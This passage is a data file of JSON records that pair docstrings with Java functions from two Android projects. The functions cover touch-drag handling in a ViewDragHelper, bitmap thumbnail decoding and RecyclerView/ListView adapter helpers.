i++) {\n\t\t\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, i);\n\t\t\t\tfinal float x = MotionEventCompat.getX(ev, i);\n\t\t\t\tfinal float y = MotionEventCompat.getY(ev, i);\n\t\t\t\tfinal float dx = x - mInitialMotionX[pointerId];\n\t\t\t\tfinal float dy = y - mInitialMotionY[pointerId];\n\n\t\t\t\treportNewEdgeDrags(dx, dy, pointerId);\n\t\t\t\tif (mDragState == STATE_DRAGGING) {\n\t\t\t\t\t// Callback might have started an edge drag.\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tfinal View toCapture = findTopChildUnder((int) x, (int) y);\n\t\t\t\tif (checkTouchSlop(toCapture, dx, dy) && tryCaptureViewForDrag(toCapture, pointerId)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tsaveLastMotion(ev);\n\t\t}\n\t\tbreak;\n\t}\n\n\tcase MotionEventCompat.ACTION_POINTER_UP: {\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n\t\tif (mDragState == STATE_DRAGGING && pointerId == mActivePointerId) {\n\t\t\t// Try to find another pointer that's still holding on to the\n\t\t\t// captured view.\n\t\t\tint newActivePointer = INVALID_POINTER;\n\t\t\tfinal int pointerCount = MotionEventCompat.getPointerCount(ev);\n\t\t\tfor (int i = 0; i < pointerCount; i++) {\n\t\t\t\tfinal int id = MotionEventCompat.getPointerId(ev, i);\n\t\t\t\tif (id == mActivePointerId) {\n\t\t\t\t\t// This one's going away, skip.\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tfinal float x = MotionEventCompat.getX(ev, i);\n\t\t\t\tfinal float y = MotionEventCompat.getY(ev, i);\n\t\t\t\tif (findTopChildUnder((int) x, (int) y) == mCapturedView && tryCaptureViewForDrag(mCapturedView, id)) {\n\t\t\t\t\tnewActivePointer = mActivePointerId;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (newActivePointer == INVALID_POINTER) {\n\t\t\t\t// We didn't find another pointer still touching the view,\n\t\t\t\t// release it.\n\t\t\t\treleaseViewForPointerUp();\n\t\t\t}\n\t\t}\n\t\tclearMotionHistory(pointerId);\n\t\tbreak;\n\t}\n\n\tcase MotionEvent.ACTION_UP: {\n\t\tif (mDragState == STATE_DRAGGING) {\n\t\t\treleaseViewForPointerUp();\n\t\t}\n\t\tcancel();\n\t\tbreak;\n\t}\n\n\tcase MotionEvent.ACTION_CANCEL: {\n\t\tif (mDragState == STATE_DRAGGING) {\n\t\t\tdispatchViewReleased(0, 0);\n\t\t}\n\t\tcancel();\n\t\tbreak;\n\t}\n\t}\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax. If the value is below\n * the minimum, it will be clamped to zero. If the value is above the\n * maximum, it will be clamped to the maximum.\n *\n * @param value\n *            Value to clamp\n * @param absMin\n *            Absolute value of the minimum significant value to return\n * @param absMax\n *            Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private int clampMag(int value, int absMin, int absMax)", "code": "{\n\tfinal int absValue = Math.abs(value);\n\tif (absValue < absMin)\n\t\treturn 0;\n\tif (absValue > absMax)\n\t\treturn value > 0 ? absMax : -absMax;\n\treturn value;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "// decodes image and scales it to reduce memory consumption\n", "func_signal": "private Bitmap decodeFile(File f)", "code": "{\n\ttry {\n\t\t// decode image size\n\t\tBitmapFactory.Options o = new BitmapFactory.Options();\n\t\to.inJustDecodeBounds = true;\n\t\tBitmapFactory.decodeStream(new FileInputStream(f), null, o);\n\n\t\t// Find the correct scale value. It should be the power of 2.\n\t\tfinal int REQUIRED_SIZE = 80;\n\t\tint width_tmp = o.outWidth, height_tmp = o.outHeight;\n\t\tint scale = 1;\n\t\twhile (true) {\n\t\t\tif (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE)\n\t\t\t\tbreak;\n\t\t\twidth_tmp /= 2;\n\t\t\theight_tmp /= 2;\n\t\t\tscale *= 2;\n\t\t}\n\n\t\t// decode with inSampleSize\n\t\tBitmapFactory.Options o2 = new BitmapFactory.Options();\n\t\to2.inSampleSize = scale;\n\t\treturn BitmapFactory.decodeStream(new FileInputStream(f), null, o2);\n\t} catch (FileNotFoundException e) {\n\t}\n\treturn null;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\phonemidea\\MusicThumbLoader.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Check if any pointer tracked in the current gesture has crossed the\n * required slop threshold.\n *\n * <p>\n * This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only\n * rely on the results of this method after all currently available touch\n * data has been provided to one of these two methods.\n * </p>\n *\n * @param directions\n *            Combination of direction flags, see\n *            {@link #DIRECTION_HORIZONTAL}, {@link #DIRECTION_VERTICAL},\n *            {@link #DIRECTION_ALL}\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions)", "code": "{\n\tfinal int count = mInitialMotionX.length;\n\tfor (int i = 0; i < count; i++) {\n\t\tif (checkTouchSlop(directions, i)) {\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Called by CREATOR.\n */\n", "func_signal": "private SavedState(Parcel in)", "code": "{\n\tsuper(in);\n\tprevScrollY = in.readInt();\n\tscrollY = in.readInt();\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\observablelib\\ObservableScrollView.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Check if the specified pointer tracked in the current gesture has crossed\n * the required slop threshold.\n *\n * <p>\n * This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only\n * rely on the results of this method after all currently available touch\n * data has been provided to one of these two methods.\n * </p>\n *\n * @param directions\n *            Combination of direction flags, see\n *            {@link #DIRECTION_HORIZONTAL}, {@link #DIRECTION_VERTICAL},\n *            {@link #DIRECTION_ALL}\n * @param pointerId\n *            ID of the pointer to slop check as specified by MotionEvent\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions, int pointerId)", "code": "{\n\tif (!isPointerDown(pointerId)) {\n\t\treturn false;\n\t}\n\n\tfinal boolean checkHorizontal = (directions & DIRECTION_HORIZONTAL) == DIRECTION_HORIZONTAL;\n\tfinal boolean checkVertical = (directions & DIRECTION_VERTICAL) == DIRECTION_VERTICAL;\n\n\tfinal float dx = mLastMotionX[pointerId] - mInitialMotionX[pointerId];\n\tfinal float dy = mLastMotionY[pointerId] - mInitialMotionY[pointerId];\n\n\tif (checkHorizontal && checkVertical) {\n\t\treturn dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n\t} else if (checkHorizontal) {\n\t\treturn Math.abs(dx) > mTouchSlop;\n\t} else if (checkVertical) {\n\t\treturn Math.abs(dy) > mTouchSlop;\n\t}\n\treturn false;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Factory method to create a new ViewDragHelper.\n *\n * @param forParent\n *            Parent view to monitor\n * @param sensitivity\n *            Multiplier for how sensitive the helper should be about\n *            detecting the start of a drag. Larger values are more\n *            sensitive. 1.0f is normal.\n * @param cb\n *            Callback to provide information and receive events\n * @return a new ViewDragHelper instance\n */\n", "func_signal": "public static ViewDragHelper create(ViewGroup forParent, float sensitivity, Callback cb)", "code": "{\n\tfinal ViewDragHelper helper = create(forParent, cb);\n\thelper.mTouchSlop = (int) (helper.mTouchSlop * (1 / sensitivity));\n\treturn helper;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Animate the view <code>child</code> to the given (left, top) position. If\n * this method returns true, the caller should invoke\n * {@link #continueSettling(boolean)} on each subsequent frame to continue\n * the motion until it returns false. If this method returns false there is\n * no further work to do to complete the movement.\n *\n * <p>\n * This operation does not count as a capture event, though\n * {@link #getCapturedView()} will still report the sliding view while the\n * slide is in progress.\n * </p>\n *\n * @param child\n *            Child view to capture and animate\n * @param finalLeft\n *            Final left position of child\n * @param finalTop\n *            Final top position of child\n * @return true if animation should continue through\n *         {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "public boolean smoothSlideViewTo(View child, int finalLeft, int finalTop)", "code": "{\n\tmCapturedView = child;\n\tmActivePointerId = INVALID_POINTER;\n\n\treturn forceSettleCapturedViewAt(finalLeft, finalTop, 0, 0);\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Check if any of the edges specified were initially touched in the\n * currently active gesture. If there is no currently active gesture this\n * method will return false.\n *\n * @param edges\n *            Edges to check for an initial edge touch. See\n *            {@link #EDGE_LEFT}, {@link #EDGE_TOP}, {@link #EDGE_RIGHT},\n *            {@link #EDGE_BOTTOM} and {@link #EDGE_ALL}\n * @return true if any of the edges specified were initially touched in the\n *         current gesture\n */\n", "func_signal": "public boolean isEdgeTouched(int edges)", "code": "{\n\tfinal int count = mInitialEdgesTouched.length;\n\tfor (int i = 0; i < count; i++) {\n\t\tif (isEdgeTouched(edges, i)) {\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Check if this event as provided to the parent view's\n * onInterceptTouchEvent should cause the parent to intercept the touch\n * event stream.\n *\n * @param ev\n *            MotionEvent provided to onInterceptTouchEvent\n * @return true if the parent view should return true from\n *         onInterceptTouchEvent\n */\n", "func_signal": "public boolean shouldInterceptTouchEvent(MotionEvent ev)", "code": "{\n\tfinal int action = MotionEventCompat.getActionMasked(ev);\n\tfinal int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n\tif (action == MotionEvent.ACTION_DOWN) {\n\t\t// Reset things for a new event stream, just in case we didn't get\n\t\t// the whole previous stream.\n\t\tcancel();\n\t}\n\n\tif (mVelocityTracker == null) {\n\t\tmVelocityTracker = VelocityTracker.obtain();\n\t}\n\tmVelocityTracker.addMovement(ev);\n\n\tswitch (action) {\n\tcase MotionEvent.ACTION_DOWN: {\n\t\tfinal float x = ev.getX();\n\t\tfinal float y = ev.getY();\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, 0);\n\t\tsaveInitialMotion(x, y, pointerId);\n\n\t\tfinal View toCapture = findTopChildUnder((int) x, (int) y);\n\n\t\t// Catch a settling view if possible.\n\t\tif (toCapture == mCapturedView && mDragState == STATE_SETTLING) {\n\t\t\ttryCaptureViewForDrag(toCapture, pointerId);\n\t\t}\n\n\t\tfinal int edgesTouched = mInitialEdgesTouched[pointerId];\n\t\tif ((edgesTouched & mTrackingEdges) != 0) {\n\t\t\tmCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n\t\t}\n\t\tbreak;\n\t}\n\n\tcase MotionEventCompat.ACTION_POINTER_DOWN: {\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n\t\tfinal float x = MotionEventCompat.getX(ev, actionIndex);\n\t\tfinal float y = MotionEventCompat.getY(ev, actionIndex);\n\n\t\tsaveInitialMotion(x, y, pointerId);\n\n\t\t// A ViewDragHelper can only manipulate one view at a time.\n\t\tif (mDragState == STATE_IDLE) {\n\t\t\tfinal int edgesTouched = mInitialEdgesTouched[pointerId];\n\t\t\tif ((edgesTouched & mTrackingEdges) != 0) {\n\t\t\t\tmCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n\t\t\t}\n\t\t} else if (mDragState == STATE_SETTLING) {\n\t\t\t// Catch a settling view if possible.\n\t\t\tfinal View toCapture = findTopChildUnder((int) x, (int) y);\n\t\t\tif (toCapture == mCapturedView) {\n\t\t\t\ttryCaptureViewForDrag(toCapture, pointerId);\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n\tcase MotionEvent.ACTION_MOVE: {\n\t\t// First to cross a touch slop over a draggable view wins. Also\n\t\t// report edge drags.\n\t\tfinal int pointerCount = MotionEventCompat.getPointerCount(ev);\n\t\tfor (int i = 0; i < pointerCount && mInitialMotionX != null && mInitialMotionY != null; i++) {\n\t\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, i);\n\t\t\tif (pointerId >= mInitialMotionX.length || pointerId >= mInitialMotionY.length) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfinal float x = MotionEventCompat.getX(ev, i);\n\t\t\tfinal float y = MotionEventCompat.getY(ev, i);\n\t\t\tfinal float dx = x - mInitialMotionX[pointerId];\n\t\t\tfinal float dy = y - mInitialMotionY[pointerId];\n\n\t\t\treportNewEdgeDrags(dx, dy, pointerId);\n\t\t\tif (mDragState == STATE_DRAGGING) {\n\t\t\t\t// Callback might have started an edge drag\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tfinal View toCapture = findTopChildUnder((int) mInitialMotionX[pointerId], (int) mInitialMotionY[pointerId]);\n\t\t\tif (toCapture != null && checkTouchSlop(toCapture, dx, dy) && tryCaptureViewForDrag(toCapture, pointerId)) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tsaveLastMotion(ev);\n\t\tbreak;\n\t}\n\n\tcase MotionEventCompat.ACTION_POINTER_UP: {\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n\t\tclearMotionHistory(pointerId);\n\t\tbreak;\n\t}\n\n\tcase MotionEvent.ACTION_UP:\n\tcase MotionEvent.ACTION_CANCEL: {\n\t\tcancel();\n\t\tbreak;\n\t}\n\t}\n\n\treturn mDragState == STATE_DRAGGING;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Like all callback events this must happen on the UI thread, but release\n * involves some extra semantics. During a release (mReleaseInProgress) is\n * the only time it is valid to call {@link #settleCapturedViewAt(int, int)}\n * or {@link #flingCapturedView(int, int, int, int)}.\n */\n", "func_signal": "private void dispatchViewReleased(float xvel, float yvel)", "code": "{\n\tmReleaseInProgress = true;\n\tmCallback.onViewReleased(mCapturedView, xvel, yvel);\n\tmReleaseInProgress = false;\n\n\tif (mDragState == STATE_DRAGGING) {\n\t\t// onViewReleased didn't call a method that would have changed this.\n\t\t// Go idle.\n\t\tsetDragState(STATE_IDLE);\n\t}\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax. If the value is below\n * the minimum, it will be clamped to zero. If the value is above the\n * maximum, it will be clamped to the maximum.\n *\n * @param value\n *            Value to clamp\n * @param absMin\n *            Absolute value of the minimum significant value to return\n * @param absMax\n *            Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private float clampMag(float value, float absMin, float absMax)", "code": "{\n\tfinal float absValue = Math.abs(value);\n\tif (absValue < absMin)\n\t\treturn 0;\n\tif (absValue > absMax)\n\t\treturn value > 0 ? absMax : -absMax;\n\treturn value;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * {@link #cancel()}, but also abort all motion in progress and snap to the\n * end of any animation.\n */\n", "func_signal": "public void abort()", "code": "{\n\tcancel();\n\tif (mDragState == STATE_SETTLING) {\n\t\tfinal int oldX = mScroller.getCurrX();\n\t\tfinal int oldY = mScroller.getCurrY();\n\t\tmScroller.abortAnimation();\n\t\tfinal int newX = mScroller.getCurrX();\n\t\tfinal int newY = mScroller.getCurrY();\n\t\tmCallback.onViewPositionChanged(mCapturedView, newX, newY, newX - oldX, newY - oldY);\n\t}\n\tsetDragState(STATE_IDLE);\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Determine if the supplied view is under the given point in the parent\n * view's coordinate system.\n *\n * @param view\n *            Child view of the parent to hit test\n * @param x\n *            X position to test in the parent's coordinate system\n * @param y\n *            Y position to test in the parent's coordinate system\n * @return true if the supplied view is under the given point, false\n *         otherwise\n */\n", "func_signal": "public boolean isViewUnder(View view, int x, int y)", "code": "{\n\tif (view == null) {\n\t\treturn false;\n\t}\n\treturn x >= view.getLeft() && x < view.getRight() && y >= view.getTop() && y < view.getBottom();\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Settle the captured view based on standard free-moving fling behavior.\n * The caller should invoke {@link #continueSettling(boolean)} on each\n * subsequent frame to continue the motion until it returns false.\n *\n * @param minLeft\n *            Minimum X position for the view's left edge\n * @param minTop\n *            Minimum Y position for the view's top edge\n * @param maxLeft\n *            Maximum X position for the view's left edge\n * @param maxTop\n *            Maximum Y position for the view's top edge\n */\n", "func_signal": "public void flingCapturedView(int minLeft, int minTop, int maxLeft, int maxTop)", "code": "{\n\tif (!mReleaseInProgress) {\n\t\tthrow new IllegalStateException(\"Cannot flingCapturedView outside of a call to \" + \"Callback#onViewReleased\");\n\t}\n\n\tmScroller.fling(mCapturedView.getLeft(), mCapturedView.getTop(),\n\t\t\t(int) VelocityTrackerCompat.getXVelocity(mVelocityTracker, mActivePointerId),\n\t\t\t(int) VelocityTrackerCompat.getYVelocity(mVelocityTracker, mActivePointerId), minLeft, maxLeft, minTop, maxTop);\n\n\tsetDragState(STATE_SETTLING);\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position.\n *\n * @param finalLeft\n *            Target left position for the captured view\n * @param finalTop\n *            Target top position for the captured view\n * @param xvel\n *            Horizontal velocity\n * @param yvel\n *            Vertical velocity\n * @return true if animation should continue through\n *         {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "private boolean forceSettleCapturedViewAt(int finalLeft, int finalTop, int xvel, int yvel)", "code": "{\n\tfinal int startLeft = mCapturedView.getLeft();\n\tfinal int startTop = mCapturedView.getTop();\n\tfinal int dx = finalLeft - startLeft;\n\tfinal int dy = finalTop - startTop;\n\n\tif (dx == 0 && dy == 0) {\n\t\t// Nothing to do. Send callbacks, be done.\n\t\tmScroller.abortAnimation();\n\t\tsetDragState(STATE_IDLE);\n\t\treturn false;\n\t}\n\n\tfinal int duration = computeSettleDuration(mCapturedView, dx, dy, xvel, yvel);\n\tmScroller.startScroll(startLeft, startTop, dx, dy, duration);\n\n\tsetDragState(STATE_SETTLING);\n\treturn true;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * The result of a call to this method is equivalent to\n * {@link #processTouchEvent(MotionEvent)} receiving an\n * ACTION_CANCEL event.\n */\n", "func_signal": "public void cancel()", "code": "{\n\tmActivePointerId = INVALID_POINTER;\n\tclearMotionHistory();\n\n\tif (mVelocityTracker != null) {\n\t\tmVelocityTracker.recycle();\n\t\tmVelocityTracker = null;\n\t}\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Move the captured settling view by the appropriate amount for the current\n * time. If <code>continueSettling</code> returns true, the caller should\n * call it again on the next frame to continue.\n *\n * @param deferCallbacks\n *            true if state callbacks should be deferred via posted message.\n *            Set this to true if you are calling this method from\n *            {@link View#computeScroll()} or similar methods\n *            invoked as part of layout or drawing.\n * @return true if settle is still in progress\n */\n", "func_signal": "public boolean continueSettling(boolean deferCallbacks)", "code": "{\n\t// Make sure, there is a captured view\n\tif (mCapturedView == null) {\n\t\treturn false;\n\t}\n\tif (mDragState == STATE_SETTLING) {\n\t\tboolean keepGoing = mScroller.computeScrollOffset();\n\t\tfinal int x = mScroller.getCurrX();\n\t\tfinal int y = mScroller.getCurrY();\n\t\tfinal int dx = x - mCapturedView.getLeft();\n\t\tfinal int dy = y - mCapturedView.getTop();\n\n\t\tif (dx != 0) {\n\t\t\tmCapturedView.offsetLeftAndRight(dx);\n\t\t}\n\t\tif (dy != 0) {\n\t\t\tmCapturedView.offsetTopAndBottom(dy);\n\t\t}\n\n\t\tif (dx != 0 || dy != 0) {\n\t\t\tmCallback.onViewPositionChanged(mCapturedView, x, y, dx, dy);\n\t\t}\n\n\t\tif (keepGoing && x == mScroller.getFinalX() && y == mScroller.getFinalY()) {\n\t\t\t// Close enough. The interpolator/scroller might think we're\n\t\t\t// still moving\n\t\t\t// but the user sure doesn't.\n\t\t\tmScroller.abortAnimation();\n\t\t\tkeepGoing = mScroller.isFinished();\n\t\t}\n\n\t\tif (!keepGoing) {\n\t\t\tif (deferCallbacks) {\n\t\t\t\tmParentView.post(mSetIdleRunnable);\n\t\t\t} else {\n\t\t\t\tsetDragState(STATE_IDLE);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn mDragState == STATE_SETTLING;\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v\n *            View to test for horizontal scrollability\n * @param checkV\n *            Whether the view v passed should itself be checked for\n *            scrollability (true), or just its children (false).\n * @param dx\n *            Delta scrolled in pixels along the X axis\n * @param dy\n *            Delta scrolled in pixels along the Y axis\n * @param x\n *            X coordinate of the active touch point\n * @param y\n *            Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int dy, int x, int y)", "code": "{\n\tif (v instanceof ViewGroup) {\n\t\tfinal ViewGroup group = (ViewGroup) v;\n\t\tfinal int scrollX = v.getScrollX();\n\t\tfinal int scrollY = v.getScrollY();\n\t\tfinal int count = group.getChildCount();\n\t\t// Count backwards - let topmost views consume scroll distance\n\t\t// first.\n\t\tfor (int i = count - 1; i >= 0; i--) {\n\t\t\t// TODO: Add versioned support here for transformed views.\n\t\t\t// This will not work for transformed views in Honeycomb+\n\t\t\tfinal View child = group.getChildAt(i);\n\t\t\tif (x + scrollX >= child.getLeft() && x + scrollX < child.getRight() && y + scrollY >= child.getTop()\n\t\t\t\t\t&& y + scrollY < child.getBottom()\n\t\t\t\t\t&& canScroll(child, true, dx, dy, x + scrollX - child.getLeft(), y + scrollY - child.getTop())) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn checkV && (ViewCompat.canScrollHorizontally(v, -dx) || ViewCompat.canScrollVertically(v, -dy));\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * Capture a specific child view for dragging within the parent. The\n * callback will be notified but\n * {@link Callback#tryCaptureView(View, int)} will not be asked\n * permission to capture this view.\n *\n * @param childView\n *            Child view to capture\n * @param activePointerId\n *            ID of the pointer that is dragging the captured child view\n */\n", "func_signal": "public void captureChildView(View childView, int activePointerId)", "code": "{\n\tif (childView.getParent() != mParentView) {\n\t\tthrow new IllegalArgumentException(\"captureChildView: parameter must be a descendant \" + \"of the ViewDragHelper's tracked parent view (\"\n\t\t\t\t+ mParentView + \")\");\n\t}\n\n\tmCapturedView = childView;\n\tmActivePointerId = activePointerId;\n\tmCallback.onViewCaptured(childView, activePointerId);\n\tsetDragState(STATE_DRAGGING);\n}", "path": "app\\src\\main\\java\\com\\dmplayer\\slidinguppanelhelper\\ViewDragHelper.java", "repo_name": "dibakarece/DMPlayer", "stars": 656, "license": "None", "language": "java", "size": 839}
{"docstring": "/**\n * \u8bbe\u7f6eTextView\u7684\u503c\n *\n * @param viewId\n * @param text\n * @return\n */\n", "func_signal": "public ViewHolder setText(int viewId, String text)", "code": "{\n    TextView tv = getView(viewId);\n    tv.setText(text);\n    return this;\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\lvgv\\ViewHolder.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u5220\u9664\u4e00\u6761\u6570\u636e\n * \u4f1a\u81ea\u52a8\u5b9a\u5411\u5237\u65b0\n *\n * @param i\n */\n", "func_signal": "public void remove(int i)", "code": "{\n    if (null != mDatas && mDatas.size() > i && i > -1) {\n        mDatas.remove(i);\n        notifyItemRemoved(i);\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u8bbe\u7f6eHeaderView\uff08\u4f1a\u5148\u6e05\u7a7aHeaderview\uff09\n *\n * @param v\n */\n", "func_signal": "public void setHeaderView(View v)", "code": "{\n    clearHeaderView();\n    addHeaderView(v);\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u6dfb\u52a0\u4e00\u6761\u6570\u636e \u81f3\u961f\u5c3e\n * \u4f1a\u81ea\u52a8\u5b9a\u5411\u5237\u65b0\n *\n * @param data\n */\n", "func_signal": "public void add(D data)", "code": "{\n    if (data != null && mDatas != null) {\n        mDatas.add(data);\n        notifyItemInserted(mDatas.size());\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u5173\u4e8e\u4e8b\u4ef6\u7684\n */\n", "func_signal": "public ViewHolder setOnClickListener(int viewId,\n                                     View.OnClickListener listener)", "code": "{\n    View view = getView(viewId);\n    view.setOnClickListener(listener);\n    return this;\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\lvgv\\ViewHolder.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u52a0\u8f7d\u66f4\u591a\u6570\u636e\n *\n * @param list\n */\n", "func_signal": "public void addDatas(List<D> list)", "code": "{\n    if (null != list) {\n        List<D> temp = new ArrayList<D>();\n        temp.addAll(list);\n        if (this.mDatas != null) {\n            this.mDatas.addAll(temp);\n        } else {\n            this.mDatas = temp;\n        }\n        notifyDataSetChanged();\n    }\n\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
